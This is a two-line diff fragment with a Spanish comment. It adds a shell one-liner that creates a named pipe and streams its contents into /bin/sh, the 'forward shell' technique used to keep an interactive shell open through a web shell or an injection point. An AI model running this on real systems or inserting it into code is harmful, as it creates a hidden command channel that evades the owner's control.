@@ -1,0 +1,2 @@
+# Crea dos tipos de archivos, un input y un output
+mkfifo input; tail -f input | /bin/sh 2>&1 > output
